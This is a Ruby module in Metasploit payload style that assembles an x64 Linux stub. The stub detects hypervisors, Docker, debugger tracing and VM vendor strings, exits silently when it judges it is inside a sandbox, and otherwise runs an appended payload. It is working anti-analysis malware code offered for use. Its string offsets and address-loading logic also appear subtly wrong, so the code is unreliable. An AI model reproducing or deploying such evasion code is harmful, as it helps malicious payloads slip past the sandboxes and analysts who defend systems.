

module Msf::Payload::Linux::X64::SandboxEvasion

  def sandbox_evasion
            asm = <<-ASM
_entry:
        jmp  _after_strings

_strings:
        db "/proc/cpuinfo", 0           ; r12 + 0   (len 14)
        db "/proc/1/cgroup", 0          ; r12 + 15  (len 15)
        db "/proc/self/status", 0       ; r12 + 31  (len 18)
        db "/sys/class/dmi/id/sys_vendor", 0  ; r12 + 50 (len 29)

_after_strings:
        call _entry_cont               ; push next RIP, then jump forward

_entry_cont:
        pop  r12                       ; r12 = address of _strings
        sub  rsp, 0x1000
        ; r15 = score accumulator
        xor  r15, r15

; ═════════════════════════════════════════════════════════════════════════════
; CHECK 1 — /proc/cpuinfo contains "hypervisor" → score += 20
; ═════════════════════════════════════════════════════════════════════════════
        lea  rdi, [r12]                ; path = r12 + 0
        xor  rsi, rsi                  ; O_RDONLY
        mov  rax, 2                    ; open()
        syscall
        test rax, rax
        js   _skip1
        mov  r13, rax                  ; save fd
        mov  rdi, r13
        mov  rsi, rsp                  ; buffer at rsp
        mov  rdx, 0x1000
        xor  rax, rax                  ; read()
        syscall
        mov  r14, rax                  ; r14 = bytes read
        mov  rdi, r13
        mov  rax, 3                    ; close(fd)
        syscall
        ; scan buffer for "hypervisor" (10 bytes)
        xor  rdx, rdx
        sub  r14, 10
_loop1:
        cmp  rdx, r14
        jge  _skip1
        cmp  byte [rsp + rdx],      'h'
        jne  _next1
        cmp  byte [rsp + rdx + 1],  'y'
        jne  _next1
        cmp  byte [rsp + rdx + 2],  'p'
        jne  _next1
        cmp  byte [rsp + rdx + 3],  'e'
        jne  _next1
        cmp  byte [rsp + rdx + 4],  'r'
        jne  _next1
        cmp  byte [rsp + rdx + 5],  'v'
        jne  _next1
        cmp  byte [rsp + rdx + 6],  'i'
        jne  _next1
        cmp  byte [rsp + rdx + 7],  's'
        jne  _next1
        cmp  byte [rsp + rdx + 8],  'o'
        jne  _next1
        cmp  byte [rsp + rdx + 9],  'r'
        jne  _next1
        add  r15, 20
        jmp  _skip1
_next1:
        inc  rdx
        jmp  _loop1
_skip1:

; ═════════════════════════════════════════════════════════════════════════════
; CHECK 2 — /proc/1/cgroup contains "docker" → score += 20
; ═════════════════════════════════════════════════════════════════════════════
        lea  rdi, [r12 + 15]           ; path = r12 + 15
        xor  rsi, rsi
        mov  rax, 2
        syscall
        test rax, rax
        js   _skip2
        mov  r13, rax
        mov  rdi, r13
        mov  rsi, rsp
        mov  rdx, 0x1000
        xor  rax, rax
        syscall
        mov  r14, rax
        mov  rdi, r13
        mov  rax, 3
        syscall
        xor  rdx, rdx
        sub  r14, 6
_loop2:
        cmp  rdx, r14
        jge  _skip2
        cmp  byte [rsp + rdx],     'd'
        jne  _next2
        cmp  byte [rsp + rdx + 1], 'o'
        jne  _next2
        cmp  byte [rsp + rdx + 2], 'c'
        jne  _next2
        cmp  byte [rsp + rdx + 3], 'k'
        jne  _next2
        cmp  byte [rsp + rdx + 4], 'e'
        jne  _next2
        cmp  byte [rsp + rdx + 5], 'r'
        jne  _next2
        add  r15, 20
        jmp  _skip2
_next2:
        inc  rdx
        jmp  _loop2
_skip2:

; ═════════════════════════════════════════════════════════════════════════════
; CHECK 3 — /proc/self/status TracerPid field != 0 → score += 25
;
; Format: "TracerPid:\t<decimal>\n"
; We locate "TracerPid:\t" then check if the next byte is '0'.
; A value of '0' means not traced; anything else means traced.
; ═════════════════════════════════════════════════════════════════════════════
        lea  rdi, [r12 + 31]           ; path = r12 + 31
        xor  rsi, rsi
        mov  rax, 2
        syscall
        test rax, rax
        js   _skip3
        mov  r13, rax
        mov  rdi, r13
        mov  rsi, rsp
        mov  rdx, 0x1000
        xor  rax, rax
        syscall
        mov  r14, rax
        mov  rdi, r13
        mov  rax, 3
        syscall
        xor  rdx, rdx
        sub  r14, 12
_loop3:
        cmp  rdx, r14
        jge  _skip3
        cmp  byte [rsp + rdx],      'T'
        jne  _next3
        cmp  byte [rsp + rdx + 1],  'r'
        jne  _next3
        cmp  byte [rsp + rdx + 2],  'a'
        jne  _next3
        cmp  byte [rsp + rdx + 3],  'c'
        jne  _next3
        cmp  byte [rsp + rdx + 4],  'e'
        jne  _next3
        cmp  byte [rsp + rdx + 5],  'r'
        jne  _next3
        cmp  byte [rsp + rdx + 6],  'P'
        jne  _next3
        cmp  byte [rsp + rdx + 7],  'i'
        jne  _next3
        cmp  byte [rsp + rdx + 8],  'd'
        jne  _next3
        cmp  byte [rsp + rdx + 9],  ':'
        jne  _next3
        cmp  byte [rsp + rdx + 10], 0x09  ; tab character
        jne  _next3
        cmp  byte [rsp + rdx + 11], '0'
        je   _next3                        ; TracerPid: 0 = not traced, skip
        add  r15, 25
        jmp  _skip3
_next3:
        inc  rdx
        jmp  _loop3
_skip3:

; ═════════════════════════════════════════════════════════════════════════════
; CHECK 4 — /sys/class/dmi/id/sys_vendor contains known VM vendor → score += 20
; Checks: "VMware", "QEMU", "innotek" (VirtualBox), "Microsoft" (Hyper-V)
; ═════════════════════════════════════════════════════════════════════════════
        lea  rdi, [r12 + 50]           ; path = r12 + 50
        xor  rsi, rsi
        mov  rax, 2
        syscall
        test rax, rax
        js   _skip4
        mov  r13, rax
        mov  rdi, r13
        mov  rsi, rsp
        mov  rdx, 0x100                ; sys_vendor is short, 256 bytes enough
        xor  rax, rax
        syscall
        mov  r14, rax
        mov  rdi, r13
        mov  rax, 3
        syscall
        xor  rdx, rdx
        sub  r14, 4
_loop4:
        cmp  rdx, r14
        jge  _skip4
        ; "VMwa" prefix → VMware
        cmp  byte [rsp + rdx],     'V'
        jne  _chk_qemu
        cmp  byte [rsp + rdx + 1], 'M'
        jne  _chk_qemu
        cmp  byte [rsp + rdx + 2], 'w'
        jne  _chk_qemu
        cmp  byte [rsp + rdx + 3], 'a'
        jne  _chk_qemu
        add  r15, 20
        jmp  _skip4
_chk_qemu:
        ; "QEMU" → QEMU/KVM
        cmp  byte [rsp + rdx],     'Q'
        jne  _chk_vbox
        cmp  byte [rsp + rdx + 1], 'E'
        jne  _chk_vbox
        cmp  byte [rsp + rdx + 2], 'M'
        jne  _chk_vbox
        cmp  byte [rsp + rdx + 3], 'U'
        jne  _chk_vbox
        add  r15, 20
        jmp  _skip4
_chk_vbox:
        ; "inno" prefix → innotek (VirtualBox)
        cmp  byte [rsp + rdx],     'i'
        jne  _chk_hyperv
        cmp  byte [rsp + rdx + 1], 'n'
        jne  _chk_hyperv
        cmp  byte [rsp + rdx + 2], 'n'
        jne  _chk_hyperv
        cmp  byte [rsp + rdx + 3], 'o'
        jne  _chk_hyperv
        add  r15, 20
        jmp  _skip4
_chk_hyperv:
        ; "Micr" prefix → Microsoft (Hyper-V)
        cmp  byte [rsp + rdx],     'M'
        jne  _next4
        cmp  byte [rsp + rdx + 1], 'i'
        jne  _next4
        cmp  byte [rsp + rdx + 2], 'c'
        jne  _next4
        cmp  byte [rsp + rdx + 3], 'r'
        jne  _next4
        add  r15, 20
        jmp  _skip4
_next4:
        inc  rdx
        jmp  _loop4
_skip4:

; ═════════════════════════════════════════════════════════════════════════════
; GATE — if score >= 50 call exit_group(0), else fall through to payload
; ═════════════════════════════════════════════════════════════════════════════
        cmp  r15, 50
        jl   _pass

        mov  rax, 231                  ; exit_group(0) — silent exit
        xor  rdi, rdi
        syscall

_pass:
        add  rsp, 0x1000               ; restore stack frame
        ; execution falls through into raw payload bytes appended by run()
            ASM

            Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
          end

        end
